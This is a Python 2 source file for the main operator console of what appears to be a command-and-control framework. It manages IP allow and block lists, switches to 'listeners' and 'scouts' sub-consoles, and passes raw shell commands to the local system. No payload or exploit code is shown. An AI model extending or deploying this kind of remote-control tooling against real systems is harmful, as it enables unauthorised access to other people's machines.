import cfg, time, subprocess
from modules.validate_ip import *
from modules.show_banner import *
from modules.cleanup_code import *
from modules.clear_screen import *
from modules.listener_handler import *
from modules.scout_handler import *

cfg.global_variables()


def root_console():
    clear()
    display_banner()
    while True:
        try:
            cfg.blacklisted_ip = list(set(cfg.blacklisted_ip))
            cfg.whitelisted_ip = list(set(cfg.whitelisted_ip))
            input = raw_input(cfg.prompt_default).strip().split(' ', 1)
            command = input[0]
            if command == 'banner':
                display_banner()
            elif command == 'help':
                print cfg.help_root
            elif command == 'quit':
                cleanup()
            elif command == 'clear':
                clear()
            elif command == 'global_add':
                try:
                    tar_type = input[1].split(' ', 1)[0]
                    tar_ip = input[1].split(' ', 1)[1]
                    if tar_type == 'bl_list':
                        if validate_ip(tar_ip):
                            cfg.blacklisted_ip.append(tar_ip)
                            print cfg.pos + 'Sucessfully added'
                        else:
                            print cfg.err + 'Argument is not an IP'
                    elif tar_type == 'wh_list':
                        if validate_ip(tar_ip):
                            cfg.whitelisted_ip.append(tar_ip)
                            print cfg.pos + 'Sucessfully added'
                        else:
                            print cfg.err + 'Argument is not an IP'
                    else:
                        print cfg.err + 'Insufficient arguments, command syntax is : "global_add <bl_list/wh_list> <IP>"'
                except IndexError:
                    print cfg.err + 'Insufficient arguments, command syntax is : "global_add <bl_list/wh_list> <IP>"'
            elif command == 'global_rm':
                try:
                    tar_type = input[1].split(' ', 1)[0]
                    tar_ip = input[1].split(' ', 1)[1]
                    if tar_type == 'bl_list':
                        if validate_ip(tar_ip):
                            cfg.blacklisted_ip.remove(tar_ip)
                            print cfg.pos + 'Sucessfully removed'
                        else:
                            print cfg.err + 'Argument is not an IP'
                    elif tar_type == 'wh_list':
                        if validate_ip(tar_ip):
                            cfg.whitelisted_ip.remove(tar_ip)
                            print cfg.pos + 'Sucessfully removed'
                        else:
                            print cfg.err + 'Argument is not an IP'
                    else:
                        print cfg.err + 'Insufficient arguments, command syntax is : "global_rm <bl_list/wh_list> <IP>"'
                except ValueError:
                    print cfg.err + 'IP not in list'
                except IndexError:
                    print cfg.err + 'Insufficient arguments, command syntax is : "global_rm <bl_list/wh_list> <IP>"'
            elif command == 'listeners':
                print cfg.pos + 'Switching...'
                listener_console()
            elif command == 'scouts':
                print cfg.pos + 'Switching...'
                scout_console()
            elif command == 'show':
                print '\n' + cfg.note + 'Whitelisted IPs :\n'
                for i in cfg.whitelisted_ip:
                    print cfg.pos + i
                print '\n' + cfg.note + 'Blacklisted IPs :\n'
                for i in cfg.blacklisted_ip:
                    print cfg.pos + i
            elif command == 'wipe':
                cfg.blacklisted_ip, cfg.whitelisted_ip = [], []
                print cfg.pos + 'Wiped blacklisted and whitelisted IPs'
            elif command == 'local':
                try:
                    execute = input[1]
                    print '\n' + cfg.note + 'Executing on system...\n'
                except IndexError:
                    print cfg.err + 'Specify a local system command to run'
                    continue
                if execute[:3] == 'cd ':
                    try:
                        execute = execute.replace('cd ', '')
                        os.chdir(execute)
                        print cfg.pos + "Changed to directory : " + execute
                    except (WindowsError, OSError):
                        print cfg.err + 'Could not change to directory : ' + execute
                else:
                    try:
                        result = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE,
                                                  stderr=subprocess.PIPE,
                                                  stdin=subprocess.PIPE)
                        result = result.stdout.read() + result.stderr.read()
                        print result
                    except:
                        print cfg.err + 'Could not execute command'
            elif command == '':
                pass
            else:
                print cfg.err + 'Unknown command "' + command + '", run "help" for help menu'
        except EOFError:
            try:
                time.sleep(3)
            except KeyboardInterrupt:
                cleanup()
        except KeyboardInterrupt:
            cleanup()
        except Exception as e:
            print cfg.err + 'Error : ' + str(e)
